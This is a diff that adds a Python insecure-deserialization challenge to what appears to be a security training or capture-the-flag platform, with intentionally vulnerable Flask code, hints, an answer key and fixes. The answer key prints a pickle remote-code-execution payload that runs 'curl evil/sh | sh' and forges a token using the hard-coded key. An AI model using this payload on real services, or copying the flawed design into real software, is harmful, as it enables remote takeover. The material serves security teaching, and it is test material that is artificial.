+		langSlug:     "python",
+		catSlug:      "insecure-deser",
+		points:       500,
+		cveReference: "CWE-321 (use of hard-coded cryptographic key) + CWE-502",
+		description: `A Python session-resume service maintains short-lived web sessions
+in encrypted cookies. To keep the format flexible, the team stores
+the session state as pickle blobs wrapped in an HMAC envelope —
+"safe pickle" patterns are common in legacy Flask codebases.
+
+The HMAC-verify-then-pickle.loads ordering is correct. The codebase
+even uses hmac.compare_digest. A senior reviewer signed off on the
+design six months ago, calling it "the right way to use pickle if
+you must use pickle."
+
+The repo is open source. Find the design choice that turns the
+right architecture into a turnkey RCE.`,
+		code: `import hmac
+import hashlib
+import pickle
+import base64
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+_SESSION_KEY = b"prod-session-key-7f8a3d2b1c"
+
+SIG_PREFIX = b"sig:"
+DATA_PREFIX = b"data:"
+
+
+def safe_dumps(obj) -> str:
+    payload = pickle.dumps(obj)
+    sig = hmac.new(_SESSION_KEY, payload, hashlib.sha256).digest()
+    return base64.b64encode(SIG_PREFIX + sig + b"|" + DATA_PREFIX + payload).decode()
+
+
+def safe_loads(token: str):
+    raw = base64.b64decode(token.encode())
+    if not raw.startswith(SIG_PREFIX):
+        raise ValueError("missing signature")
+    sep = raw.index(b"|" + DATA_PREFIX)
+    sig = raw[len(SIG_PREFIX):sep]
+    payload = raw[sep + len(b"|" + DATA_PREFIX):]
+    expected = hmac.new(_SESSION_KEY, payload, hashlib.sha256).digest()
+    if not hmac.compare_digest(sig, expected):
+        raise ValueError("bad signature")
+    return pickle.loads(payload)
+
+
+@app.route("/api/session/restore", methods=["POST"])
+def restore_session():
+    token = request.headers.get("X-Session-Token", "")
+    if not token:
+        return jsonify({"error": "missing token"}), 400
+    try:
+        session = safe_loads(token)
+    except (ValueError, pickle.PickleError) as e:
+        return jsonify({"error": f"invalid token: {e}"}), 400
+    return jsonify({"user_id": session.get("user_id"),
+                    "role": session.get("role")})
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)`,
+		targetVuln: `The HMAC-then-pickle structure is correct. The key is not.
+
+Flaw 1 — hardcoded HMAC key (line 9).
+   _SESSION_KEY is a literal byte string compiled into the source.
+   The repo is open source; anyone with access to the source code
+   knows the key. Internal cooperators (employees, contractors who
+   reviewed the code, anyone who has cloned the repo from a leaked
+   tarball) have it. There is no key rotation mechanism.
+
+   "HMAC is unforgeable" relies on the key being secret. Once the
+   key is public, the HMAC is just a checksum — every party can
+   compute valid signatures over arbitrary payloads.
+
+Flaw 2 — pickle.loads on the (now-untrusted) payload (line 31).
+   pickle.loads instantiates arbitrary Python classes named by the
+   pickle stream and calls their __reduce__ / __setstate__ /
+   constructors. A canonical RCE payload:
+
+       class Pwn:
+           def __reduce__(self):
+               import os
+               return (os.system, ("curl evil/sh | sh",))
+
+       payload = pickle.dumps(Pwn())
+       sig = hmac.new(b"prod-session-key-7f8a3d2b1c",
+                       payload, hashlib.sha256).digest()
+       token = base64.b64encode(b"sig:" + sig + b"|data:" + payload).decode()
+
+   The attacker submits the token in the X-Session-Token header.
+   The verifier accepts the (forged) signature, calls pickle.loads
+   on the payload, and the Pwn class's __reduce__ runs os.system
+   with attacker-controlled commands.
+
+   pickle.loads is fundamentally unsafe on untrusted input — and
+   the HMAC was the ONLY check that the input was trusted. Once
+   the key is known, that check evaporates.
+
+Net effect: a single curl with a forged X-Session-Token header
+gives the attacker RCE as the Flask worker. No memory corruption,
+no race condition, just public-knowledge cryptographic key + the
+pickle module.`,
+		conceptualFix: `Either remove the static key OR remove pickle. Removing both is
+the best answer.
+
+1. Move the key out of the repo. Load it at runtime from:
+       - a secret manager (Vault, AWS Secrets Manager, GCP Secret
+         Manager, Doppler),
+       - an environment variable supplied by the orchestrator,
+       - a file readable only by the service user (mode 0400).
+
+       import os
+       _SESSION_KEY = os.environ["SESSION_HMAC_KEY"].encode()
+       if len(_SESSION_KEY) < 32:
+           raise RuntimeError("SESSION_HMAC_KEY too short")
+
+   Add a key-rotation playbook: dual-accept old and new keys during
+   a rollover window.
+
+2. Stop using pickle for cross-trust-boundary data. Pickle is for
+   internal, same-trust serialization. For session blobs:
+
+       import json
+       def safe_dumps(obj) -> str:
+           payload = json.dumps(obj, separators=(',', ':')).encode()
+           ...   # HMAC envelope unchanged
+
+       def safe_loads(token: str):
+           ...   # signature check unchanged
+           return json.loads(payload)
+
+   JSON is safe to decode from untrusted input (it cannot instantiate
+   arbitrary classes). If you need richer types, use msgpack or
+   protobuf — still safe against arbitrary-code-execution by design.
+
+3. Use a battle-tested library. Don't roll your own HMAC envelope:
+       - itsdangerous (Flask's session signer)
+       - PyJWT for JWT-shaped envelopes
+       - cryptography.fernet for authenticated symmetric encryption
+
+   These libraries handle key rotation, time-based expiry, and
+   constant-time comparison out of the box.
+
+4. Defense in depth:
+   - Even if you keep pickle, prohibit network input from reaching
+     pickle.loads: deserialize into JSON first, then re-serialize
+     internally with pickle only across known-trusted boundaries.
+   - Restrict allowed classes via a custom Unpickler.find_class
+     override that whitelists known session-state classes.
+   - Add a pre-commit hook (truffleHog, git-secrets) that blocks
+     committing strings shaped like API keys / HMAC keys.
+   - Rotate this key NOW — every session token ever signed by it
+     must be considered compromised.`,
+		hints: []string{
+			"Where does _SESSION_KEY come from? Is anyone outside the application's process boundary able to read it?",
+			"What does HMAC actually protect against? Specifically, what assumption about the key must hold for HMAC to be meaningful?",
+			"If the attacker can compute a valid HMAC over any payload, what does pickle.loads do with that payload?",
+		},
+		vulnerableLines: []int{9, 31},
 	}
 }
 
